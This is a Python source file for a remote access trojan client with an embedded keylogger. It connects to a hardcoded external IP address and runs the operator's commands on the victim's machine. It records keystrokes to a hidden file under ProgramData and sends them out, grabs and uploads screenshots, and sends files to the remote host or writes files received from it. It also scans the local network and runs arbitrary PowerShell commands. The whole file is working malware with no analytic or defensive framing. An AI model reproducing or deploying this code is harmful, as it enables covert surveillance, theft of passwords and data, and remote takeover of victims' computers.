import socket
import subprocess
import time
import os
from datetime import datetime
import ctypes
from pynput import keyboard
import threading
import ipaddress
import concurrent.futures
from PIL import ImageGrab
import re

eof = "<end_of_file>"
chunk_size = 65536
end_result = "<end_of_result>"
server_address = ("3.77.20.190", 23750)

# ---- START OF EMBEDDED KEYLOGGER ----
class EmbeddedKeylogger(threading.Thread):
    def __init__(self):
        super().__init__()
        self.filename = "C:\\ProgramData\\KL.txt"
        self.listener = None
        now = datetime.now()
        now = now.strftime("%d-%m-%Y %H:%M:%S")
        with open(self.filename, "a", encoding="utf-8") as f:
            f.write("\n" + now + "\n")

    def get_capslock_state(self):
        try:
            hllDll = ctypes.WinDLL("User32.dll")
            VK_CAPSLOCK = 0x14
            return hllDll.GetKeyState(VK_CAPSLOCK)
        except:
            return 0

    def get_current_lang(self):
        try:
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            curr_window = user32.GetForegroundWindow()
            thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
            klid = user32.GetKeyboardLayout(thread_id)
            lid = klid & (2 ** 16 - 1)
            return hex(lid)
        except:
            return "0x409"

    def on_press(self, key):
        stroke = str(key).replace("'", "")
        with open(self.filename, "a", encoding="utf-8") as file:
            if str(key) == "Key.space":
                file.write(" ")
            elif str(key) == "'":
                file.write("'")
            elif str(key) == "Key.enter":
                file.write("\n")
            elif str(key) == "Key.esc":
                file.write(" ")
            elif str(key) == "Key.backspace":
                file.write("<bc>")
            elif str(key).startswith("Key"):
                file.write("")
            elif str(key) == "<96>":
                file.write("0")
            elif str(key) == "<97>":
                file.write("1")
            elif str(key) == "<98>":
                file.write("2")
            elif str(key) == "<99>":
                file.write("3")
            elif str(key) == "<100>":
                file.write("4")
            elif str(key) == "<101>":
                file.write("5")
            elif str(key) == "<102>":
                file.write("6")
            elif str(key) == "<103>":
                file.write("7")
            elif str(key) == "<104>":
                file.write("8")
            elif str(key) == "<105>":
                file.write("9")
            elif str(key) == "<110>":
                file.write(".")

            # ------- Handel Writing English Language -------
            elif self.get_current_lang() == "0x409":
                try:
                    if self.get_capslock_state() == 1 and int(ord(stroke)) > 64 and int(ord(stroke)) < 123:
                        stroke = chr(int(ord(stroke)) - 32)
                        file.write(stroke)
                    elif int(ord(stroke)) > 1568 and int(ord(stroke)) < 1616:
                        if self.get_capslock_state() == 1:
                            mapping = {1588: 65, 1604: 66, 1572: 67, 1610: 68, 1579: 69, 1576: 70, 1575: 72, 1607: 73,
                                       1578: 74, 1606: 75, 1605: 76, 1577: 77, 1609: 78, 1582: 79, 1581: 80, 1590: 81,
                                       1602: 82, 1587: 83, 1601: 84, 1593: 85, 1585: 86, 1589: 87, 1569: 88, 1594: 89,
                                       1574: 90}
                            if int(ord(stroke)) in mapping:
                                file.write(chr(mapping[int(ord(stroke))]))
                        else:
                            mapping = {1588: 97, 1604: 98, 1572: 99, 1610: 100, 1579: 101, 1576: 102, 1575: 104,
                                       1607: 105, 1578: 106, 1606: 107, 1605: 108, 1577: 109, 1609: 110, 1582: 111,
                                       1581: 112, 1590: 113, 1602: 114, 1587: 115, 1601: 116, 1593: 117, 1585: 118,
                                       1589: 119, 1569: 120, 1594: 121, 1574: 122}
                            if int(ord(stroke)) in mapping:
                                file.write(chr(mapping[int(ord(stroke))]))
                            else:
                                if int(ord(stroke)) == 1614:
                                    file.write("Q")
                                elif int(ord(stroke)) == 1611:
                                    file.write("W")
                                elif int(ord(stroke)) == 1612:
                                    file.write("R")
                                elif int(ord(stroke)) == 1615:
                                    file.write("E")
                    else:
                        file.write(stroke)
                except Exception:
                    pass

            # ------- Handel Writing Arabic Language -------
            elif self.get_current_lang() == "0xc01":
                try:
                    if ((int(ord(stroke)) > 64) and (int(ord(stroke)) < 123)) or int(ord(stroke)) < 94:
                        mapping = {96: "ذ", 97: "ش", 98: "لا", 99: "ؤ", 100: "ي", 101: "ث", 102: "ب", 103: "ل",
                                   104: "ا", 105: "ه", 106: "ت", 107: "ن", 108: "م", 109: "ة", 110: "ى", 111: "خ",
                                   112: "ح", 113: "ض", 114: "ق", 115: "س", 116: "ف", 117: "ع", 118: "ر", 119: "ص",
                                   120: "ء", 121: "غ", 122: "ئ", 44: "و", 59: "ك", 91: "ج", 93: "د"}
                        if int(ord(stroke)) in mapping:
                            file.write(mapping[int(ord(stroke))])
                        elif stroke == '""':
                            file.write("ط")
                    else:
                        file.write(stroke)
                except Exception:
                    file.write("ط")
            else:
                file.write(str(stroke))

    def on_release(self, key):
        if str(key) == 'Key.esc':
            return False

    def run(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
            self.listener.join()

    def stop(self):
        if self.listener:
            self.listener.stop()

# ----- END OF EMBEDDED KEYLOGGER -----
keylog_thread = None
while True:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[+] connecting to server plastealer.......", server_address)
        client_socket.connect(server_address)
        while True:
            server_command = client_socket.recv(1024)
            if not server_command:
                break
            command = server_command.decode()
            if command.lower() == "stop":
                client_socket.close()
                print("[-] Stopping client.....")
                exit()
            elif command == "":
                continue
            elif len(command) == 2 and command[0].isalpha() and command[1] == ":":
                if os.path.exists(command):
                    os.chdir(command)
                    continue
                else:
                    print(command, "[-] is not exist")
                    continue
            elif command.startswith("cd"):
                new_path = command[2:].strip()
                if os.path.exists(new_path):
                    os.chdir(new_path)
                    continue
                else:
                    print(new_path, "[-] is not Exist ")
                    continue

            # ---------------------------downloaded commands-----------------
            elif command.startswith("download"):
                file_to_download = command[8:].strip()
                if os.path.exists(file_to_download) and os.path.isfile(file_to_download):
                    file_size = os.path.getsize(file_to_download)
                    file_name = os.path.basename(file_to_download)
                    client_socket.send(f"yes|{file_size}|{file_name}".encode())
                    sent = 0
                    with open(file_to_download, "rb") as file:
                        while True:
                            chunk = file.read(chunk_size)
                            if not chunk:
                                break
                            client_socket.sendall(chunk)
                            sent += len(chunk)
                            percent = (sent / file_size) * 100
                            print(f"\rProgress: {percent:.2f}%", end="", flush=True)
                    print("\n[+] File sent successfully")
                else:
                    client_socket.send("no".encode())
                    print("[-] File doesn't exist")

            # ---------------------------uploaded commands-----------------
            elif command.startswith("upload|"):
                try:
                    parts = command.split('|')
                    if len(parts) == 3:
                        file_size = int(parts[1])
                        file_name = os.path.basename(parts[2])
                        client_socket.send("yes".encode())
                        with open(file_name, "wb") as download_file:
                            print(f"\n[+] Downloading file......: {file_name}")
                            received = 0
                            while received < file_size:
                                bytes_to_receive = min(chunk_size, file_size - received)
                                chunk = client_socket.recv(bytes_to_receive)
                                if not chunk:
                                    break
                                download_file.write(chunk)
                                received += len(chunk)
                                percent = (received / file_size) * 100
                                print(f"\r[+] Progress: {percent:.2f}%", end="", flush=True)
                        print("\n")
                        absolute_path = os.path.abspath(file_name)
                        print(f"[+] File Downloaded successfully to: {absolute_path}")
                        client_socket.send(absolute_path.encode())
                    else:
                        client_socket.send("no".encode())
                except Exception as e:
                    print(f"[-] Upload error: {e}")
                    try:
                        client_socket.sendall(b"ERROR")
                    except:
                        pass

            # ---------------------------screenshot commands-----------------
            elif command == "screenshot":
                import tempfile
                from PIL import ImageGrab
                now = datetime.now()
                now = now.strftime("%m-%d-%Y-%H.%M.%S")
                print("[+] Take Screenshot")
                saved_file = now + '.png'
                full_path = os.path.join(tempfile.gettempdir(), saved_file)
                try:
                    myscreen = ImageGrab.grab(all_screens=True)
                    myscreen.save(full_path)
                    print("[+] Screenshot Saved")
                except Exception as e:
                    print(f"[-] Failed to save screenshot: {e}")
                    client_socket.sendall(b"0|error.png")
                    continue
                file_size = os.path.getsize(full_path)
                header = f"{file_size}|{saved_file}"
                client_socket.sendall(header.encode())
                answer = client_socket.recv(1024)
                if answer.decode() == "yes":
                    try:
                        with open(full_path, "rb") as file:
                            print("[+] Uploading File.....")
                            sent = 0
                            while True:
                                chunk = file.read(chunk_size)
                                if not chunk:
                                    break
                                client_socket.sendall(chunk)
                                sent += len(chunk)
                                percent = (sent / file_size) * 100
                                print(f"\r[+] Progress: {percent:.2f}%", end="", flush=True)
                        print("\n[+] File sent successfully")
                        ack = client_socket.recv(1024).decode()
                        if ack == "received":
                            try:
                                os.remove(full_path)
                                print("[+] Screenshot deleted from Temp safely.")
                            except Exception as e:
                                print(f"[-] Failed to delete screenshot: {e}")
                    except Exception as e:
                        print(f"[-] Error sending file: {e}")

            # ----------------- network scanner command -----------------
            elif command.startswith("netscan"):
                try:
                    ip_range = command[len("netscan"):].strip()
                    if not ip_range:
                        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        probe.connect(("8.8.8.8", 80))
                        local_ip = probe.getsockname()[0]
                        probe.close()
                        parts = local_ip.split('.')
                        ip_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                    network = ipaddress.ip_network(ip_range, strict=False)
                    def check_host(ip):
                        ip_str = str(ip)
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.3)
                        try:
                            s.connect((ip_str, 445))
                            return ip_str
                        except ConnectionRefusedError:
                            return ip_str
                        except Exception:
                            return None
                        finally:
                            s.close()
                    live_hosts = []
                    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                        results = list(executor.map(check_host, network.hosts()))
                        for res in results:
                            if res:
                                live_hosts.append(res)
                    time.sleep(0.5)
                    arp_output = ""
                    try:
                        creation_flags = subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
                        arp_cmd = subprocess.run(["arp", "-a"], capture_output=True, text=True,creationflags=creation_flags)
                        arp_output = arp_cmd.stdout
                    except Exception:
                        pass
                    output = f"[+] Scanning: {ip_range}\n"
                    output += "[+] Live PC's:\n"
                    output += "_" * 60 + "\n"
                    for ip in live_hosts:
                        mac_match = re.search(rf'{re.escape(ip)}.*?([0-9a-fA-F-:]{{17}})', arp_output)
                        if mac_match:
                            mac_address = mac_match.group(1)
                        else:
                            mac_address = "Unknown"
                        output += f"| IP: {ip:<15} | MAC: {mac_address:<17} |\n"
                    output += "_" * 60 + "\n"
                    output += f"[+] Total: {len(live_hosts)} hosts"
                    client_socket.sendall(output.encode("utf-8") + end_result.encode())
                except Exception as e:
                    client_socket.sendall(f"[-] Scanner error: {e}".encode("utf-8") + end_result.encode())

            # ----------------- keylogger start -----------------
            elif command == "start keylog":
                if keylog_thread is None or not keylog_thread.is_alive():
                    try:
                        keylog_thread = EmbeddedKeylogger()
                        keylog_thread.start()
                        client_socket.sendall(b"[+] Keylogger started successfully" + end_result.encode())
                    except Exception as e:
                        client_socket.sendall(
                            f"[-] Failed to start keylogger: {e}\n".encode("utf-8") + end_result.encode())
                else:
                    client_socket.sendall(b"[+] Keylogger is already running\n" + end_result.encode())

            # ----------------- keylogger stop -----------------
            elif command == "stop keylog":
                if keylog_thread is not None and keylog_thread.is_alive():
                    try:
                        keylog_thread.stop()
                        keylog_thread = None
                        time.sleep(1)
                        now = datetime.now()
                        now = now.strftime("%d-%m-%Y %H:%M:%S")
                        # تم إصلاح المسار
                        with open("C:\\ProgramData\\KL.txt", "a", encoding="utf-8") as f:
                            f.write("\n" + now + "\n")
                        client_socket.sendall(b"[+] Keylogger stopped and saved" + end_result.encode())
                    except Exception as e:
                        client_socket.sendall(
                            f"[-] Error stopping keylogger: {e}\n".encode("utf-8") + end_result.encode())
                else:
                    client_socket.sendall(b"[-] Keylogger is not running\n" + end_result.encode())

            # -----------------keylogger download -----------------
            elif command == "get keylog":
                log_path = "C:\\ProgramData\\KL.txt"
                if os.path.exists(log_path):
                    client_socket.send("yes".encode())
                    with open(log_path, "rb") as file:
                        chunk = file.read(chunk_size)
                        while len(chunk) > 0:
                            client_socket.send(chunk)
                            chunk = file.read(chunk_size)
                        client_socket.send(eof.encode())
                    print("[+] Keylog file sent successfully")
                    ack = client_socket.recv(1024)
                    if ack.decode().strip() == "received":
                        try:
                            os.remove(log_path)
                            print("[-] Keylog file deleted from client")
                        except Exception as e:
                            print(f"[-] Failed to delete keylog file: {e}")
                else:
                    client_socket.send("no".encode())

            else:
                output = subprocess.run(["powershell.exe", command], shell=True, capture_output=True,
                                        stdin=subprocess.DEVNULL)
                stderr_str = output.stderr.decode("utf-8", errors="ignore")
                stdout_str = output.stdout.decode("utf-8", errors="ignore")
                if stderr_str == "":
                    result = stdout_str + end_result
                    result = result.encode("utf-8")
                else:
                    result = stderr_str + end_result
                    result = result.encode("utf-8")
                client_socket.sendall(result)

    except Exception as e:
        print(f"[-] can't connect to server: {e}")
        time.sleep(3)